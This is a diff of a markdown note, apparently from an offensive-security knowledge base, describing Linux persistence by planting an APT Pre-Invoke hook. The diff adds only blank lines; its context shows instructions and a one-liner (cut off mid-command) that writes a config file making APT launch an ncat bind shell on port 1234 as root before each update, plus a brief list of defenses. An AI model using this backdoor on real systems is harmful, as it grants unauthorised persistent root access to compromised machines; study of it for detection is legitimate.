@@ -37,6 +37,8 @@ Technical Explanation: The attacker modifies the APT configuration file to inclu
 
 Business Value: This technique allows an attacker to maintain persistent access to a compromised Linux system, which can be used to steal sensitive data, install additional malware, or launch further attacks against the organization.
 
+ 
+
 ## Requirements
 
 1. Access to a compromised Linux system
@@ -44,6 +46,8 @@ Business Value: This technique allows an attacker to maintain persistent access 
 1. Knowledge of APT package manager configuration
 
 1. Privileged access to modify APT configuration file
+
+ 
 
 ## Defense
 
@@ -53,23 +57,39 @@ Business Value: This technique allows an attacker to maintain persistent access 
 
 1. Limit privileges of users and applications to prevent modification of APT configuration files
 
+ 
+
 ## Objectives
 
 1. Maintain persistent access to a compromised Linux system
 
 1. Execute arbitrary commands as the root user
 
+ 
+
 # Instructions
 
 1. To execute a command before APT update, you can create a file in the /etc/apt/apt.conf.d/ directory with the name starting with a number, followed by the command to be executed. For example, 10mycommand:
 
+ 
+
+
+
 **Code**: [[APT::Update::Pre-Invoke {&quot;CMD&quot;};]]
+
+
 
 > This command allows you to execute a command before running an APT update. You can create a file in the /etc/apt/apt.conf.d/ directory with a name starting with a number followed by the command to be executed. This command can be used to perform tasks like updating package lists or cleaning up old packages before running an APT update.
 
 2. This command creates a backdoor in the APT package manager. When executed, it will listen on port 1234 and spawn a shell for anyone who connects to it.
 
+ 
+
+
+
 **Code**: [[echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 12]]
+
+
 
 > The command uses the 'echo' command to write a configuration file to the '/etc/apt/apt.conf.d/' directory. The configuration file sets a 'Pre-Invoke' command for the APT package manager. This command will be executed before any package updates are performed. The command that is set will listen on port 1234 using 'ncat' and spawn a shell for anyone who connects to it. The 'nohup' command is used to ensure that the command continues to run even if the user who executed it logs out. The '2> /dev/null' redirects any error messages to the null device to prevent them from being displayed.
 
@@ -93,3 +113,5 @@ Business Value: This technique allows an attacker to maintain persistent access 
 
 - [[Backdooring the APT]]
 - [[Linux - Persistence]]
+
+
